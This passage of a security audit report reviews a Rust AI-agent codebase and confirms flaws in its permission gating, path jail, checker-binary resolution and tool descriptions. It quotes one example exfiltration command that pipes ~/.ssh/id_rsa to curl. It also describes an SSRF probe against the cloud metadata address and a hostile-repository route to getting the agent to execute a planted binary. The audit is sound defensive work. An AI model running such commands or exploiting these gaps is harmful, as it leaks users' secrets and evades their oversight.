        },
```
The same shape at `validate.rs:262-272` (`node`), `:322-332` (`tsc`), and `:919-…`
(mypy/pyright/tsc/eslint).

`is_clean()` ignores warnings entirely (`validate.rs:38-40`):
```rust
    pub fn is_clean(&self) -> bool {
        !self.diagnostics.iter().any(|d| d.severity == "error")
    }
```

And `check_file` renders `is_clean()` as a tick (`check_file.rs:136-141`):
```rust
                let status = if result.is_clean() {
                    format!("[{}] ✓ No syntax errors.", result.checker)
                } else {
                    has_errors = true;
                    result.format_inline()
                };
                sections.push(format!("=== Syntax ===\n{status}"));
```
`result.format_inline()` — the only thing that would have printed the warning text — is in
the **else** branch. So when Python is not installed, `check_file(path="x.py")` returns:
```
=== Syntax ===
[py_compile] ✓ No syntax errors.
```
The warning message is constructed and then discarded. The model is told the file passed a
check that never ran. A missing tool reads as a passing check. **Exactly as claimed.**

The same pattern repeats for every tier in `check_file`: `[{}] ✓ All imports resolvable.`
(`check_file.rs:150`), `[{}] ✓ All named imports resolve to actual exports.`
(`check_file.rs:165-168`), and the Tier-3 block.

**One place where it is NOT silent, worth recording for the fix:** `write_file` and
`edit_file` gate on `!result.diagnostics.is_empty()` instead of `is_clean()`
(`write_file.rs:155-160`, `edit_file.rs:221-226`), so *they* do print the warning as
"⚠ Lint feedback". The inconsistency is the tell: the same `LintResult` means "clean" in
one consumer and "has something to say" in another.

**Reasoning:** CONFIRMED. This is the archetypal inert-but-green defect and it is worse
than a display bug — `has_errors` stays `false`, so the tool's overall verdict is a pass,
and the agent proceeds to mark work done on the strength of a check that did not execute.

**If the fix were applied as written:** It works, but there is a real product decision the
plan does not state and the implementer must not make silently: **a missing checker is not
the same as a failing checker.** Making `is_clean()` count warnings turns "Python isn't
installed" into a hard `check_file` failure on every Windows box without Python — which
will read as a regression. The right shape is a third state (`Skipped`/`Unavailable`)
rendered distinctly, e.g. `[py_compile] ⊘ not run — Python not available`, with
`has_errors` untouched but the tick withheld. Whatever is chosen, the tick must never be
printed for a checker that did not run.

---

## P3-19 · `resolve_python` executes an interpreter from the workspace under inspection
**Verdict:** CONFIRMED, and it is broader than `resolve_python` — four more binaries are resolved against the workspace

**Evidence:**

`autodev-core/src/agent/builtin_tools/validate.rs:979-1016`:
```rust
pub fn resolve_python(working_dir: &str) -> String {
…
    let candidates: Vec<String> = if cfg!(target_os = "windows") {
        vec![
            format!("{working_dir}\\.venv\\Scripts\\python.exe"),
            format!("{working_dir}\\venv\\Scripts\\python.exe"),
            format!("{working_dir}\\env\\Scripts\\python.exe"),
            format!("{working_dir}\\.env\\Scripts\\python.exe"),
            "python".into(),
        ]
    } else {
        vec![
            format!("{working_dir}/.venv/bin/python3"),
…
    for c in candidates {
        // Absolute paths: check existence. System names: let OS find them.
        if Path::new(&c).is_absolute() {
            if Path::new(&c).exists() {
                return c;
            }
```
The returned string is executed directly (`validate.rs:220-223`), and the only test applied
to it is `exists()`.

**Why this is reachable without any model misbehaviour.** `tier1_syntax` runs the Python
branch for any `.py` file (`validate.rs:114`), and `tier1_syntax` is called
**unconditionally after every write** (`write_file.rs:155`, `edit_file.rs:221`) and by
`check_file`. `check_file` declares itself read-only and permission-free
(`check_file.rs:75-79`):
```rust
    fn is_read_only(&self) -> bool {
        true
    }
    fn requires_permission(&self) -> bool {
        false
    }
```
so it is auto-approved in every `PermissionMode` (`tool_executor.rs:154`) and runs in the
**concurrent read partition with no permission code at all** (`tool_executor.rs:277-283`,
`:338-339`). Net effect: **`check_file(path="anything.py")` — a tool the product classifies
as read-only — executes a binary supplied by the repository being inspected, unprompted.**
Cloning a hostile repo that ships `.venv/bin/python3` is sufficient; the agent need only
touch a `.py` file.

**The same defect, four more binaries.** `run_checker_subprocess` sets the child's working
directory to the workspace (`validate.rs:914-918`):
```rust
    let result = tokio::process::Command::new(bin)
        .args(args)
        .current_dir(working_dir)
        .output()
        .await;
```
with `bin` ∈ {`mypy`, `pyright`, `tsc`, `eslint`} (`validate.rs:851-903`), and
`check_tsc_syntax` does the same for Tier 1 `tsc` (`validate.rs:302-318`). On Windows,
`CreateProcess`'s default search order includes the process's current directory, so a
`tsc.exe` / `mypy.exe` / `eslint.exe` at the workspace root is a candidate for execution.
That is the identical trust failure without the explicit `.venv` join, and the plan does
not mention it.

**Reasoning:** CONFIRMED. "Arbitrary-code-execution path" is the correct characterisation:
the workspace is attacker-controlled input in the threat model this whole phase assumes
(the entire `path_jail` module exists because model-chosen paths are not trusted), yet the
*interpreter* is taken from that same untrusted tree with no provenance check.

**If the fix were applied as written:** Removing the workspace candidates works but has a
real cost the plan should acknowledge: the comment at `validate.rs:980-983` explains that
the venv interpreter is preferred *so project dependencies are on `sys.path`* — dropping it
makes `py_compile` run under a system Python. For `py_compile` (a pure syntax parse) that
is harmless; it would matter for `mypy`. Two viable shapes: (a) system interpreter only for
Tier 1, workspace venv only behind an explicit per-workspace opt-in the user grants once;
or (b) keep the venv but require the workspace to be marked trusted. What must not happen is
a fix that only edits `resolve_python` and leaves `run_checker_subprocess`'s
`.current_dir(working_dir)` — that is the same hole with four more binaries in it.

---
## P3-20 · There are 33 defective tool descriptions
**Verdict:** OVERSTATED as a defect count; the underlying problem is real. The word "defective" is doing two different jobs.

**Denominator first.** 38 unique `impl Tool for` blocks exist in
`autodev-core/src/agent/builtin_tools/` (ripgrep, deduplicated), and the
`FastDevelopment | Review` arm of `register_for_mode` registers 38 of them
(`builtin_tools/mod.rs:190-259`). So the claim asserts **33 of 38 — 87%** are defective.

**Sample of 12 (well over the 6 asked for), each checked against the code it describes.**

**A. Flatly contradicted by the implementation — 3 of 12.**

1. `glob` (`glob.rs:55-59`):
```rust
        "Find files matching a glob pattern. \
         Supports patterns like '*.rs', '**/*.py', 'src/**/test_*.rs'. \
         Returns list of matching file paths. \
         Automatically respects .gitignore and skips common noise directories."
```
The string `gitignore` appears **only in this description**. There is no `ignore` crate, no
`.gitignore` parsing, no gitignore anything in the file. The actual filter is a hardcoded
array (`glob.rs:121-129`): `["node_modules", ".git", "target", "dist", "build", ".next", ".cache"]`.
A model told the tool respects `.gitignore` will trust its results to exclude ignored
build output and secrets directories. It does not.

2. `bash`, Windows branch (`bash.rs:25`):
```rust
        return "Execute a shell command in the working directory. … Platform note: The shell is Windows CMD. Avoid Unix-only utilities (`head`, `tail`, `jq`, `grep` in pipes). Use PowerShell-compatible alternatives or run commands separately.";
```
The description tells the model the shell is **CMD** and in the same sentence to write
**PowerShell**. The executor is CMD (`bash.rs:97-100`):
```rust
        let mut shell_cmd = if cfg!(target_os = "windows") {
            let mut cmd = Command::new("cmd");
            cmd.args(["/C", &command]);
```
And `rewrite_for_windows` actively converts the model's Unix pipes into PowerShell
(`bash.rs:490-497`):
```rust
    out = out.replace(" | head -n ", " | Select-Object -First ");
    out = out.replace(" | head -", " | Select-Object -First ");
…
    out = out.replace(" | grep ", " | Select-String ");
```
`Select-Object` and `Select-String` are cmdlets; `cmd /C` cannot run them. The rewriter
turns a command that would have failed one way into one that fails another, the failure
handler (`bash.rs:177-188`) then advises the model to use *more* PowerShell, and the loop
closes. This is not a wording nit — the description, the rewriter and the executor
disagree about which shell exists.

3. `e2e_probe` (`e2e_probe.rs:46-55`): *"Always tears down its children before returning."*
Children are killed on the success path (`e2e_probe.rs:239-241`) and on spawn failure
(`:220-222`), but on the timeout path the future is dropped and the tool asserts
(`:160-164`):
```rust
            Err(_) => ToolResult::error(format!(
                "e2e_probe timed out after {}s — probe URL '{probe_url}' did not respond \
                 with '{expected}' before the deadline. Children were killed.",
```
`kill_on_drop(true)` kills the direct child — `sh` / `cmd` — not its descendants. The
actual dev server (`sh -c "npm run dev"` → node) survives, holding the port. The tool
reports as fact something it does not do.

**B. Overclaims a safety property — 1 of 12.**

4. `check_file` (`check_file.rs:28`): *"Run lint / syntax / import checks on a file without
executing it."* True of the *file*, false of the *toolchain*: `check_file` executes an
interpreter resolved from the workspace under inspection (P3-19) and, at Tier 3, `eslint`
with the workspace's own config. A model reading "without executing it" reasonably
concludes the call has no execution side effects.

**C. Omits a limit that silently changes the answer — 1 of 12.**

5. `list_directory` (`list_directory.rs:16-18`): *"List files and subdirectories at a path.
Returns structured JSON with name, path, is_directory, size_bytes."* Not stated: recursion
is capped at **depth 3** (`list_directory.rs:66`: `if recursive { 3 } else { 1 }`), results
are capped at **500** (`:47`), and truncation is signalled only by a `truncated` field in
the payload. A model that recurses a deep tree and sees no `src/deep/deeper/x.rs` will
conclude the file does not exist.

**D. Accurate and, in one case, exemplary — 7 of 12.**

6. `read_file` (`read_file.rs:27-35`) is the model the rest should follow: it states the
   800-line no-range refusal, the 2,000-line per-call ceiling, and what the error tells you.
7. `edit_file` (`edit_file.rs:33-38`) — exact-match requirement, multi-match failure,
   `replace_all`, and when to prefer `write_file`. Accurate.
8. `write_file` (`write_file.rs:20-25`) — refuse-on-exists, `overwrite=true`,
   parent-dir creation. All three verified true (`write_file.rs:101`, `:113-121`).
9. `append_file` (`append_file.rs:24-27`) — `.create(true)` confirmed at `append_file.rs:109`.
10. `grep` (`grep.rs:66-71`) — documents `max_results=100` and the `truncated` flag, which is
    exactly the disclosure `list_directory` lacks.
11. `spawn_subagent` (`spawn_subagent.rs:26-30`) — *"Parent blocks until subagent completes"*
    is true (`spawn_subagent.rs:183`, `mgr.await_result(&handle.id).await`).
12. `update_task_status` (`update_task_status_tool.rs:22-27`) — enumerates the valid status
    set; matches the DB.

**Proportion found: 5 of 12 defective (~42%), of which 3 are flatly false.**

**Reasoning:** "Defective" is fair as a characterisation — three of twelve say things the
code does not do, and two of those (`glob`, `bash`) will actively mislead a model into
wrong conclusions or failing commands. But 42% of a sample does not project to 87% of the
population, and several of the descriptions are *good* — `read_file` in particular is
better than what most of this class of tool ships with. The claim reads as though 33
descriptions contain errors; what I can support is that a minority contain errors and a
majority would need rewriting to meet a uniform house standard (state the effect, the
limits, the failure modes, and when not to use the tool). Those are different tasks with
different risks, and the plan's `DOC-GATE` marker suggests the second reading was intended —
but the sentence says the first.

**If the fix were applied as written:** A blanket "rewrite all 33" carries a specific
hazard this area cannot afford: the three flatly-false descriptions are false because the
*code* is wrong or inconsistent (`glob` has no gitignore support; `bash` runs the wrong
shell; `e2e_probe` does not kill grandchildren). Rewriting the description to match the
code would ratify three defects as intended behaviour and close them as documentation
work. Each of those three needs a code decision first. Recommend splitting P3-20 into
(a) descriptions that lie about behaviour — file each as a **code** bug; (b) descriptions
that omit limits — pure doc work; (c) the house-standard rewrite of the rest. And keep
`read_file`'s as the template.

---

## P3-21 · `e2e_probe` runs arbitrary shell with no jail, no evidence capture and no output capture
**Verdict:** CONFIRMED on all three, and the file's own header claims the opposite of one of them

**Evidence — arbitrary shell, no jail.**

`autodev-core/src/agent/builtin_tools/e2e_probe.rs:191-210`:
```rust
    for cmd_str in &start_cmds {
        let child = if cfg!(target_os = "windows") {
            Command::new("cmd")
                .args(["/C", cmd_str])
                .current_dir(&working_dir)
                .stdout(Stdio::null())
                .stderr(Stdio::null())
                .stdin(Stdio::null())
                .kill_on_drop(true)
                .spawn()
        } else {
            Command::new("sh")
                .args(["-c", cmd_str])
                .current_dir(&working_dir)
…
```
`start_cmds` is a model-supplied array of *"bash one-liner"* strings
(`e2e_probe.rs:61-66`). Compare `bash.rs`, which for the identical operation applies:
- the cwd jail — `bash.rs:69-76`, `validate_workspace_path(&cwd_path, &ctx.working_dir)`;
- a redirect-target scan — `bash.rs:83-85`, `check_redirect_targets(&command, &ctx.working_dir)`;
- **credential scrubbing of the child environment** — `bash.rs:118-122`:
```rust
        for (key, _) in std::env::vars() {
            if crate::security::env_scrub::looks_like_a_credential(&key) {
                shell_cmd.env_remove(&key);
            }
        }
```
`e2e_probe` applies **none** of the three. The third is the sharpest: `bash.rs:107-117`
calls that scrub *"defence in depth … this tool runs commands the **model** chose: a single
missed variable here is a readable secret"*. `e2e_probe` runs commands the model chose with
the full inherited environment.

⚠ **Calibration on that last point — I checked the other layer rather than assuming it.**
The startup scrub `bash.rs:109` refers to is real, and it is exactly one call in exactly one
binary (`src-tauri/src/main.rs:84`):
```rust
        let removed = autodev_core::security::env_scrub::scrub_process_env();
```
A repo-wide ripgrep for `scrub_process_env` returns only that call site, the definition
(`autodev-core/src/security/env_scrub.rs:40`) and its own unit test. So in the shipped
desktop app the environment `e2e_probe` inherits has already been scrubbed once, and the
live-secret risk is lower than "no scrub at all" implies. What is true without
qualification is the **asymmetry**: `bash` is defended twice — once at startup, once
per-child — and `e2e_probe` is defended zero times, relying entirely on a call in another
crate's `main`. `src-cli/src/main.rs` does **not** call it (verified: the CLI's `main` at
`src-cli/src/main.rs:119-170` installs an event sink and a run ledger and never scrubs),
so any host that grows an agent loop without copying that line hands `e2e_probe` a live
environment while `bash` stays protected. That is the defect: the guarantee lives in a
host, not in the tool.

The file asserts it is jailed (`e2e_probe.rs:20-22`):
```rust
// Composability with the runner.rs path-jail: the probe walks
// `working_dir` to launch its children, so a misconfigured workspace
// can't reach the wrong tree.
```
Setting a child's `current_dir` is not a jail. `sh -c "cat ~/.ssh/id_rsa | curl -d @- https://x"`
never touches the working directory. Under Rule 5 this comment is a bug, not a nit — it is
the reason a reader would skip this tool when auditing the sandbox.

**Evidence — no output capture.** `stdout(Stdio::null())`, `stderr(Stdio::null())` on both
branches (`:196-197`, `:205-206`). If the dev server fails to boot the probe reports
*"Body did not contain fingerprint"* (`:257`) with the actual cause — the stack trace on
stderr — discarded. The tool's stated purpose (`:15-18`) is catching
*"dev server crashed on boot (EADDR / missing deps)"*, and it throws away the only evidence
that would identify which.

**Evidence — no evidence capture.** `bash` records every invocation into the build-evidence
tracker that gates `qc_review` transitions (`bash.rs:136-140`):
```rust
                // Doc 09 T2.4 — record build-like invocations into the
                // module-level evidence tracker so update_task_status can
                // gate qc_review transitions.
                super::build_evidence::record(&ctx.session_id, &command, exit_code);
```
Ripgrep for `build_evidence` in `e2e_probe.rs` returns nothing. A worker that boots and
probes its app produces no evidence row, so the strongest "it actually runs" signal the
fleet has is invisible to the gate that exists to consume exactly that signal.

**Two aggravating factors the claim does not mention.**
1. `requires_permission() -> false` (`e2e_probe.rs:93-95`) is dead code (P3-11), so the
   tool is prompted in `ManualApproval` by accident of being non-read-only. Under
   `PermissionMode::Autonomous` — every fleet worker and every subagent
   (`recipes/runner.rs:768`, `subagent/native_runner.rs:197`) — it runs unprompted.
2. `probe_url` is unconstrained and up to 400 characters of the response body are returned
   to the model (`e2e_probe.rs:251`: `response_body_excerpt: Some(body.chars().take(400).collect())`).
   That is a server-side request forgery primitive with a readback channel — a GET against
   `http://169.254.169.254/…` or any internal host, with the answer handed to the model.
   Paired with unrestricted `start_cmds`, this tool is the single widest hole in the
   builtin surface.

**Reasoning:** CONFIRMED, three for three, with a header comment claiming the missing
property.

**If the fix were applied as written:** It works, and it should reuse `bash.rs` rather than
re-derive it — one shared spawn helper carrying the cwd jail, the redirect scan, the
credential scrub, the timeout and the evidence hook, called by both tools. Three things the
fix must not skip:
- **Kill the process group, not the child.** `kill_on_drop` on `sh` leaves the dev server
  running and the port bound; the next probe then passes against the *previous* run's
  server. That is a false green, not just a leak.
- **Capture output to a bounded buffer**, mirroring `bash.rs:159-172`'s tail-keeping
  truncation — the tail is where boot failures print.
- **Constrain `probe_url`.** A jail on `start_cmds` with an unrestricted `probe_url` leaves
  the exfiltration channel open. Loopback-only by default is the obvious floor for a tool
  whose stated job is probing a local dev server.

---
## Verdict summary

| Claim | Verdict |
|---|---|
| P3-10 · two execution paths, `execute()` has zero callers | **CONFIRMED** |
| P3-11 · prompting keyed on `is_read_only`, no `ToolEffect` | **CONFIRMED** (understates it — `requires_permission()` is dead too) |
| P3-12 · `PermissionMode` unhonoured, PA dropdown does nothing | **PARTIALLY CONFIRMED** — mechanism true, UI attribution **refuted** |
| P3-14 · six path-taking tools bypass the jail, two act on the path | **CONFIRMED** |
| P3-15 · the jail rewrites rather than refuses; two steps corrupt | **CONFIRMED** (demonstrated by execution) |
| P3-16 · unnormalised key in three subsystems | **CONFIRMED** ×3, plus a fourth instance the claim misses |
| P3-17 · locks across unbounded awaits; zero timeouts in `validate.rs` | **CONFIRMED** |
| P3-18 · missing binary reads as "✓ No syntax errors" | **CONFIRMED**, verbatim |
| P3-19 · `resolve_python` executes from the workspace | **CONFIRMED**, and broader than stated |
| P3-20 · 33 defective tool descriptions | **OVERSTATED** — ~42% of a 12-sample, 3 flatly false |
| P3-21 · `e2e_probe`: no jail, no evidence, no output capture | **CONFIRMED** ×3 |

---

## What I could not determine

**1. Whether `path_jail` actually *escapes* on Linux/macOS, or only rewrites.**
On Windows the Win32 layer normalises `..` lexically before `Path::exists()` reaches the
filesystem, so probe cases A–C were correctly refused and I could only demonstrate a
silent *rewrite* (case G). On Linux the kernel resolves `..` during path walk and returns
`ENOENT` when an intermediate is missing, so `parent.exists()` stays false, the drop-loop
at `path_jail.rs:56-71` runs further, and I expect a real escape. **Measurement that would
settle it:** run the standalone probe
(`<scratchpad>/jailprobe.rs`, cases A–C, no repo dependency) on a Linux host, or add a
`#[cfg(unix)]` unit test in `path_jail.rs` asserting that
`validate_workspace_path(ws.join("nope/../../ESCAPED.txt"), ws)` is `Err`. If it returns
`Ok` with a path outside `ws`, P3-15 is a **jail escape** on every non-Windows build and
should be re-tiered accordingly.

**2. Whether `Command::new("tsc")` with `.current_dir(workspace)` actually picks up a
workspace-planted `tsc.exe` on this Windows build.** `CreateProcess`'s documented search
order includes the current directory, but Rust's `std::process::Command` program
resolution and the `NoDefaultCurrentDirectoryInExePath` environment variable both modify
it, and I did not want to plant an executable to find out. **Measurement:** in a scratch
directory, place a trivial `tsc.exe` that writes a sentinel file, run a program that does
`Command::new("tsc").current_dir(that_dir).output()`, and check for the sentinel. If it
fires, `validate.rs:914-918` is a second `resolve_python`-class hole with four binaries in
it and P3-19's scope must widen.

**3. The true count behind "33 defective descriptions".** I sampled 12 and found 5
defective by the strict reading (says something the code does not do, or omits a limit that
silently changes results). I did not audit the remaining 26. **Measurement:** the count is
only meaningful once "defective" is defined. Write the house standard first (effect,
limits, failure modes, when not to use), then a mechanical pass — a test that asserts every
`description()` mentions its tool's documented cap where one exists would turn this from a
judgement call into a gate that can fail.

**4. Whether the `PAMode::Review` prose has any measurable effect on model behaviour.**
It changes only the system prompt (`context.rs:85`); the tool set and permission mode are
identical to Fast Development. Whether the prompt alone changes what the model does is an
empirical question about the model, not about this code. **Measurement:** a fixed
transcript replayed under both prompts, counting write-tool calls per turn. Until that
exists, the honest description of Review is "a different system prompt", not "adds a
permission checkpoint" as `context.rs:263` claims.

**5. I did not run `cargo check --workspace --all-targets`.** Every verdict above rests on
static reading plus a standalone `rustc` probe that copies the functions under test
verbatim; no verdict depends on the tree compiling. Flagging it so nobody reads this report
as a build-health statement.

---

## Claims I would add

Ordered by how directly each lets a model-chosen path or command cross a boundary.

**N-1 (HIGH, security) — the concurrent read partition has no permission code at all, so
`is_read_only() -> true` is an unconditional bypass of every mode.**
`tool_executor.rs:277-283` partitions on `is_read_only()`, and the read branch executes
without consulting `self.mode`, `always_allow`, or anything else
(`tool_executor.rs:338-339`):
```rust
                    // Execute (read-only always approved)
                    let result = Self::redact_result(tool.execute(input.clone(), &ctx).await);
```
This is not a synonym for P3-11. P3-11 says the *key* is wrong; this says that on the
**only live path** there is no gate to key at all — even `PermissionMode::ManualApproval`
never sees a read tool. Two tools currently exploit that flag while doing far more than
reading: `check_file` (`check_file.rs:73-78`, spawns interpreters — P3-19) and
`analyze_diff` (`analyze_diff_tool.rs:52-54`, `is_read_only() -> true`, ships a repo diff to
a provider). Any future tool that mislabels itself is silently ungated. The fix for P3-10
and P3-11 must not treat "collapse the paths" as sufficient — the merged path must gate the
read branch, which today it does not.
*(Partially anticipated: `P3-56` covers `analyze_diff`'s network egress specifically. The
general property — read partition is ungated — is not stated anywhere in P3-C.)*

**N-2 (HIGH, security) — `e2e_probe`'s `probe_url` is an unrestricted SSRF primitive with a
readback channel.** `e2e_probe.rs:111-114` accepts any URL; `http_probe` issues the GET
(`:279-283`); and 400 characters of the response are returned to the model
(`e2e_probe.rs:251`):
```rust
                response_body_excerpt: Some(body.chars().take(400).collect()),
```
The tool is non-read-only so it prompts under `ManualApproval`, but it runs unprompted for
every fleet worker and subagent (`PermissionMode::Autonomous` at `recipes/runner.rs:768`
and `subagent/native_runner.rs:197`). P3-21 names the shell; it does not name the URL. A
jail on `start_cmds` that leaves `probe_url` open closes the front door and leaves the
window up.

**N-3 (HIGH, correctness) — a panic in any read-only tool corrupts the conversation and
kills the turn.** `tool_executor.rs:287-290` pre-fills results with
`(String::new(), ToolResult::error("placeholder"))`. On a `JoinError` the slot is never
replaced (`tool_executor.rs:390-393`):
```rust
                    Err(e) => {
                        error!("Read-only tool task panicked: {}", e);
                        // Placeholder will be replaced; we need to find which one failed
                    }
```
The comment states the bug: the code cannot identify which call failed. Downstream,
`engine.rs:657-659` keys results by `tool_use_id`, so the empty-string id never matches the
model's `tool_use` block. Result: the failed call gets **no `tool_result` at all** — which
both Anthropic and OpenAI reject on the next request — and a spurious entry with an empty
`tool_use_id` and empty `name` is appended by `engine.rs:676-683`. One `unwrap()` in one
read tool ends the session's turn with an API error that names nothing. Fix: capture
`original_idx` and `tool_use_id` *outside* the spawned task so the `Err` arm can fill the
slot with a real error result.

**N-4 (MEDIUM, security/correctness) — `bash`'s redirect jail inherits P3-15's rewrite
bug.** `bash.rs:341` and `:350` decide whether to refuse a `>` / `>>` / `tee` target by
testing `validate_workspace_path(...).is_err()`. Per P3-15 that function can return `Ok`
for a path it silently rewrote, so a redirect target it cannot faithfully normalise is
**allowed** rather than refused — the opposite of the stated policy at `bash.rs:317-321`
(*"we prefer to err on the side of refusal"*). This is a second consumer of the P3-15
defect and it is a policy inversion, not just a wrong path. It should be listed as a
dependent of P3-15 so both are re-tested together.

**N-5 (MEDIUM, data loss) — `append_file` mutates files with no checkpoint.** `write_file`
(`write_file.rs:124-127`) and `edit_file` (`edit_file.rs:177-180`) both call
`auto_checkpoint_before_write`. Ripgrep for `checkpoint` in `append_file.rs` returns
nothing. `append_file` is registered in both the PA and MCP-worker sets
(`builtin_tools/mod.rs:108`, `:200`) and its own description
(`append_file.rs:24-27`) recommends it for `requirements.txt` and `package.json` — exactly
the files whose corruption is expensive. It is the one mutating file tool with no undo
snapshot, and the checkpoint UI will show a gap rather than an error.

**N-6 (MEDIUM, security) — `Recipe::permission_mode` is a stored, user-editable,
UI-exposed setting that no code reads.** Detailed under P3-12. Four shipped recipes declare
`Supervised` (`recipes/defaults.rs:857, 1309, 1857, 1939`); `runner.rs:768` hardcodes
`PermissionMode::Autonomous`; `.permission_mode` has **zero** read sites in any `*.rs`. A
control that persists a safety choice and discards it is worse than no control — the user
has evidence they made the choice. Belongs in P3-C alongside P3-12, not left to P4.

**N-7 (LOW, correctness) — the CI gates for the redaction boundary are string counts over
`tool_executor.rs`, and P3-10 will break them.** `src-tauri/src/ci_gate.rs:795-867` asserts
`code.contains("tool.execute(")` and *"expected at least 3 tool.execute call sites"*
(`:813`). Collapsing to one execution path — P3-10's whole purpose — makes that gate fail
for the right reason, and the gate's own message anticipates it (*"This gate must be
re-pointed if so."*). Same for `tool_trait.rs:169-209`'s
`no_tool_context_site_hardcodes_identity`, which asserts `sites >= 3` and equality between
the site count and the `identity.role` / `identity.depth` occurrence counts. Both must be
re-pointed **in the same commit** as P3-10, or the phase lands red and someone weakens the
gate to make it green — the exact failure mode the repo's own gate-writing lessons warn
about.

**N-8 (LOW, correctness) — `graph_tools` is declared but never registered.**
`builtin_tools/mod.rs:14` declares `pub mod graph_tools;` and no `register_*` function
mentions it. Not a security issue; noted so a future tool-surface count is not inflated by its unreachable tool definitions, and so nobody "fixes" the omission by registering them
without a permission review first.
